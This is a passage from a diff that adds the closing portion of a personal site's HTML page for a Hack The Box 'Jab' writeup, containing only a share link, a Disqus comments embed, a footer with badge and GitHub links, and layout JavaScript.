+  <a href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Jab.html&amp;text=Writeup+for+HTB%20Jab%20writeup+from+HTB+held+on+2024-06-28%2000:00:00%20+0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+      <hr>
+      <div id="disqus_thread"></div>
+<script>
+    function disqus_config() {
+        this.callbacks.onReady.push(function() {
+            setSizes();
+        });
+    }
+    (function () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://captainirs-github-io.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by
+        Disqus.</a>
+</noscript>
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('show');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
